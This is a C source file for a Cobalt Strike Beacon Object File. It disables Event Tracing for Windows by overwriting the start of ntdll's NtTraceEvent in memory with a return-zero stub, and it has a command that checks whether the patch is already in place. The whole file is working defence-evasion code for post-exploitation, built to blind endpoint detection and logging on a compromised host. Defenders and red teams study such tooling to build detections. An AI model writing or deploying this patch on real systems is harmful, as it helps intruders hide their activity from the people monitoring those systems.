#include <windows.h>
#include "beacon.h"

#define STATUS_SUCCESS 0x00000000
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

//Import
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$memcmp (void*, void*, size_t);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

// define 
#define ETW_PATCH_BYTES {'\x48', '\x33', '\xc0', '\xc3'}
#define ETW_PATCH_SIZE 4

// functions
BOOL checkETW(){
    unsigned char etwPatch[] = ETW_PATCH_BYTES;

    HMODULE h_NTDLL = KERNEL32$GetModuleHandleA("ntdll.dll");

    if(h_NTDLL == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot get ntdll address.\n");
        return -1;
    }

    void* pETWaddress = (void*)KERNEL32$GetProcAddress(h_NTDLL, "NtTraceEvent");

    if(pETWaddress == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot get address.\n");
        return -1;
    }

    if (!MSVCRT$memcmp((PVOID)etwPatch, pETWaddress, sizeof(etwPatch))) //found clean bytes
    {
         return TRUE;

    } else
    {
        return FALSE;
    }
}

void patchETW(){
    HMODULE hNtdll;
    FARPROC ntTraceEventAddr;
    ULONG_PTR baseAddress;
    DWORD oldprotect;
    SIZE_T bufferSize;
    NTSTATUS status;
    char patchFuncName[] = { 'N', 't', 'T', 'r', 'a', 'c', 'e', 'E', 'v', 'e', 'n', 't', '\0'};
    char patchModName[] = { 'n','t','d','l','l','.','d','l','l','\0' };
    HANDLE hProc = NtCurrentProcess();

    BOOL patched = checkETW();

    if (!patched) {
        hNtdll = KERNEL32$GetModuleHandleA(patchModName);
        ntTraceEventAddr = KERNEL32$GetProcAddress(hNtdll, patchFuncName);
        if (ntTraceEventAddr == NULL) {
            return;
        }

        baseAddress = (ULONG_PTR)ntTraceEventAddr;
        bufferSize = ETW_PATCH_SIZE;
        status = NTDLL$NtProtectVirtualMemory(hProc, (PVOID*)&baseAddress, &bufferSize, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (status != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR , "Failed to modify memory permission to READWRITE.");
            return;
        }

        const char buffer[] = ETW_PATCH_BYTES;
        for (unsigned int i = 0; i < ETW_PATCH_SIZE; i++) {
            ((char*)ntTraceEventAddr)[i] = buffer[i];
        }

        status = NTDLL$NtProtectVirtualMemory(hProc, (PVOID*)&baseAddress, &bufferSize, oldprotect, &oldprotect);
        if (status != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to modify memory permission to original state.");
            return;
        }
        
        //check again to see if above succeeded
        if(checkETW())
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] patched.\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] NOT patched.\n");
        }

    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT , "[+] already patched, I did nothing.\n");
    }

}

void go(char * args, int len) {

    datap parser;
    BeaconDataParse(&parser, args, len);
    int command = BeaconDataInt(&parser);

    if (command == 1)
    {
        if(checkETW()) {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] patched.\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] NOT patched.\n");
        }
    }
    else if (command == 2)
    {
        patchETW();
    }
}
